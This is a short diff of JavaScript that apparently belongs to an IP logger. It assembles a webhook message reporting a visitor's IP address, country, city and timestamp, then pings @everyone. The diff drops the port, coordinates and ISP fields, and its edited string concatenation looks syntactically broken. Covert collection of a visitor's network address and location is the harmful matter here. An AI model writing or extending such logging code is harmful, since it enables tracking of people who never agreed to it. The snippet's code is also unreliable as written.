@@ -223,12 +223,9 @@
                 body: JSON.stringify({
                     content: `⚠️ **Done** ⚠️\n\n` +
                              `**IP:** \`${ip}\`\n` +
-                             `**Port:** \`${port}\`\n` +
                              `**Location:** ${country} - ${city}\n` +
-                             `**Coordinates:** ${loc}\n` +
-                             `**ISP:** ${org}\n` +
                              `**Time:** ${dateTime}`
-                             @everyone
+                             `**@everyone**` 
                 })
             });
         });
